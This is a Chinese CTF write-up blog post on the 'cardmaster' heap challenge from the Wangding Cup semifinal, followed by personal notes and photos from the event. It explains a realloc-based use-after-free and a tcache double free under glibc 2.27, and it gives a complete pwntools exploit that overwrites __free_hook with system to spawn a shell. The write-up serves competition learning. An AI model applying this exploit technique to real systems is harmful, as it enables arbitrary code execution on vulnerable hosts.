---
title: 第四届 “网鼎杯” 网络安全大赛半决赛 - cardmaster
date: 2026/05/07 19:15:00
updated: 2026/05/09 19:12:00
tags:
    - glibc2.27
    - realloc
    - heap - tcache
excerpt: 利用 `realloc(p,0)` 触发 UAF 留下悬挂指针，在无 tcache dup 检查的 libc 下构造 double free 污染 tcache freelist，劫持 `__free_hook` 为 `system`，释放 `/bin/sh` 拿 shell。
thumbnail: /assets/wangding2024/half-door.jpg
---

# 题解

{% callout green fa-heart %}
初赛可以看 [*dbgbgtf* 师傅](https://dbgtf.org/wangding/)的 writeup。
{% endcallout %}

## 文件属性

|属性  |值    |
|------|------|
|Arch  |amd64 |
|RELRO |Full  |
|Canary|on    |
|NX    |on    |
|PIE   |on    |
|strip |yes   |
|libc  |2.27-3ubuntu1|

## 解题思路

菜单题一道，考堆，但是没有 `free`。当时是我没想到，我一直想着靠 `realloc` 去构造空洞，
但实际上当 `p` 非 `NULL` 且 `size` 为 0 时，`realloc` 等价于 `free(p)`。

注意到在 set info 时，如果卡牌数量为 0，那么 `realloc` 会释放指针；同时 `realloc`
返回的 `NULL` 不会赋值给 `this->cardset`，因此会留下一个悬挂指针。此时回头看本题的
libc，是 **应用安全措施之前的版本，因此 tcache dup 是没有检查的，可以直接做 double
free。** 再次 set info 并输入 0 张卡牌数，就可以在 tcache 链子上挂同一个堆块，
后续拿回来之后，就可以修改其 `fd` 达到任意分配的目的了。

{% callout green fa-boxes-stacked :: Ubuntu 软件包版本后缀与更新频道 %}
Ubuntu 软件包更新分多个频道，常见的有 Release, Security 和 Updates。Release 是 Ubuntu
大版本刚发布时包的版本，如果后续更新了包，则会同步到 Updates。如果更新是安全更新，
则会同步到 Security 以保证最快速的响应。像这次的 libc 就是 Ubuntu 发布时的 Release
包，没有应用后续的安全更新，如果后缀是 1.6 这种，那就是 Security 或 Updates 频道的包。
{% endcallout %}

<img src="/assets/wangding2024/setinfo-uaf.png" width="70%">

剩下的思路就很简单了，在 `__free_hook` 上写上 `system`，然后释放包含 `"/bin/sh"`
的堆块就可以拿到 shell 了。为了能反复操控 double free 的堆块，并且减少堆块分配，
我交替 set info 和 init cards，并始终将卡牌数量设为 0。借助 cardset 在 init
cards 后首次分配使用 `malloc` ，可以轻松实现修改 freelist。

{% callout purple fa-layer-group %}
在利用的过程中要注意 `realloc` 如果了两个参数均不为 0，即需要调整堆块大小，
则拿到的新堆块是不会从 tcache 取的。因此要额外考虑这种情况下对堆风水的影响。
{% endcallout %}

{% folding blue::在脚本中实现内存分配示踪 %}
我自己写了一下内存分配情况，在脚本里实现了类似 mtrace 的效果，当时调试的时候令我诧异的是，
连续 double free 3 次，0x50 堆块确实 3 个都在链子上了，但是 0x90 的堆块却只有 1 个空闲的，
还莫名奇妙多了个 `0x20` 的堆块。在翻阅源码并进一步调试后，才发现 `this->suits` 在使用
`realloc` free 后，会被写入 `NULL`，此时再 double free 一次就会实际执行 `realloc(0, 0)`，
此时 glibc 并没有视其为 `free(0)`，而是视其为 `malloc(0)`，导致多分配了一个小堆块。

<img src="/assets/wangding2024/mtrace.png" width="30%">
{% endfolding %}

## EXPLOIT

```python
from pwn import *
def GOLD_TEXT(x): return f'\x1b[33m{x}\x1b[0m'
context.arch = 'amd64'
EXE = './cardmaster'

def payload(lo: int):
    global t, first_suit
    v = False
    if lo:
        t = process(EXE)
        if lo & 2:
            gdb.attach(t)
        if lo & 4:
            v = True
    else:
        t = remote('', 9999)
    elf = ELF(EXE)
    libc = elf.libc
    first_suit = True

    def wrap(size: int) -> str:
        return f'{(size + 0x17) & ~0xf:<#6x}'

    def initcard(ignore: bool = False):
        global first_suit, suits
        if not ignore:
            t.sendlineafter(b'>>', b'1')

        trace(f'+ {wrap(0x28)} => cardset')
        trace(f'+ {wrap(0x20)} => suits')
        trace(f'+ {wrap(0xd0)} => card (x4)')
        first_suit = True
        suits = 1

    def setinfo(count: int, rang: int, level: int, cardset: bytes):
        global first_suit, suits
        t.sendlineafter(b'>>', b'2')
        t.sendlineafter(b'count', str(count).encode())
        t.sendlineafter(b'rang', str(rang).encode())
        t.sendlineafter(b'level', str(level).encode())
        if count:
            t.sendafter(b'suite set', cardset)

        if first_suit:
            first_suit = False
            trace(f'+ {wrap(count * 4)} => cardset')
        elif count == 0:
            trace(f'- cardset')
        else:
            trace(f'^ {wrap(count * 4)} => cardset')
        if suits is None:
            trace(f'+ {wrap(count * 8)} => suits')
            suits = 1
        elif count == 0:
            trace(f'- suits')
            suits = None
        else:
            trace(f'^ {wrap(count * 8)} => suits')
        if rang:
            for _ in range(count):
                trace(f'+ {wrap(rang * 16)} => card')

    def getinfo() -> bytes:
        t.sendlineafter(b'>>', b'3')
        t.recvuntil(b'set:')
        return t.recvline(drop=True)

    def trace(msg: str):
        if v:
            info(msg)

    # Leak libc base at top chunk
    initcard(ignore=True)
    setinfo(0x200, 0, 0, b'x')
    setinfo(0, 0, 0, b'x')
    libc_base = u64(getinfo() + b'\0\0') - 0x3ebca0
    success(GOLD_TEXT(f'Leak libc_base: {libc_base:#x}'))
    libc.address = libc_base

    # Construct tcache dup
    initcard()
    setinfo(0x10, 0, 0, b'x')
    setinfo(0, 0, 0, b'x')
    setinfo(0, 0, 0, b'x')
    setinfo(0, 0, 0, b'x')

    # Hijack freelist to run system
    initcard()
    # consume 0x50-size chunk
    setinfo(0x10, 0, 0, p64(libc.symbols['__free_hook']))
    initcard()
    setinfo(0x10, 0, 0, b'x')
    initcard()
    setinfo(0x10, 0, 0, p64(libc.symbols['system']))
    initcard()
    setinfo(0x40, 0, 0, b'/bin/sh\0')
    setinfo(0, 0, 0, b'x')

    t.clean()
    t.interactive()
    t.close()
```

## 参考

1. [2024网鼎 - dblog](https://dbgtf.org/wangding/)

# 碎碎念

本来比赛打完就该写博客了，但是我当时想着把这题做出来了再说，毕竟可以 free 了，
但是平时在忙，一直没空研究怎么做，然后就偷懒了，找 lilac 要了 exp，发现要打 IO？
我上网一搜，发现别人的解法很简单，所以直到最近，我才研究清楚直接 tcache dup 就可以了，
总算是把这个天坑填上了。

当时初赛本来都没希望了，后面 ban 了一批，加上名额总共 150，靠着 110 名左右成功晋级半决赛了。
这次半决赛也是我第一次遇到空白✌️的地方。

不得不说，网鼎杯的场馆订的很大，几乎都包场了，而且衣服质量也很好，比国赛发的那件像校服的短袖，
或者长城杯的衬衫好多了。再加上吉祥物、超 500 支队伍以及周边宣传，看得出来网鼎杯是真的在用心搞。

比赛分为 4 组，一开始我还以为大家题目都不一样呢，别的组分数都上万了，我们学生组都没有破万的，
结果后面一问，都是同一套题，被老赛棍吓哭了😭

做个 CTF 一看一个堆，一个内核，一个 JIT，只能做一个还做不出来；渗透当时也一点不会，
上午算是牢完了。下午运维有什么 nginx 配置，podman 配置啥的，依旧啥也不会，还好
*xinhu* 有个本地大模型，虽然当时他把 LLM 放容器里跑，导致纯 CPU 运算，吐词一个字一个字吐的，
不过总归做出几题。没想到就这么几题，就把我们拉到了总排名第 4 的位置上，成功晋级决赛。

{% callout red fa-star %}
<img src="/assets/wangding2024/half-rank.jpg" width="80%">
{% endcallout %}

{% folding pink::✨网鼎杯半决赛照片集 %}
<img src="/assets/wangding2024/half-on-plane.jpg" width="30%">
<p align="center"><em>“云上贵州”</em></p>
<img src="/assets/wangding2024/half-station.jpg" width="60%">
<p align="center"><em>下了飞机还得坐地铁到火车站才能到酒店</em></p>
<img src="/assets/wangding2024/half-checkin.jpg" width="90%">
<p align="center"><em>签到处</em></p>
<img src="/assets/wangding2024/half-door.jpg" width="60%">
<p align="center"><em>赛场安检处大门</em></p>
<img src="/assets/wangding2024/half-symbol.jpg" width="60%">
<p align="center"><em>网鼎杯大球</em></p>
<img src="/assets/wangding2024/half-platform.jpg" width="60%">
<p align="center"><em>合影的地方</em></p>
<img src="/assets/wangding2024/half-stamp.jpg" width="30%">
<p align="center"><em>签到好之后会在手上敲个章</em></p>
<img src="/assets/wangding2024/half-conf-room.jpg" width="40%">
<p align="center"><em>开会的地方，领导估计有几十个</em></p>
<img src="/assets/wangding2024/half-hotel.jpg" width="40%">
<p align="center"><em>这酒店每天还有免费小甜水喝😋</em></p>
<img src="/assets/wangding2024/half-overview.jpg">
<p align="center"><em>超级大会场</em></p>
{% endfolding %}

{% callout green fa-window-maximize :: 依旧赛宁特制平台，有一说一，赛宁的平台 UI 看起来真的赏心悦目 %}
<img src="/assets/wangding2024/half-ui.png" width="60%">
<p align="center"><em>主界面</em></p>
<img src="/assets/wangding2024/half-ui1.png" width="60%">
<p align="center"><em>CTF 赛道</em></p>
<img src="/assets/wangding2024/half-ui2.png" width="60%">
<p align="center"><em>渗透赛道</em></p>
<img src="/assets/wangding2024/half-ui3.png" width="60%">
<p align="center"><em>运维赛道</em></p>
{% endcallout %}
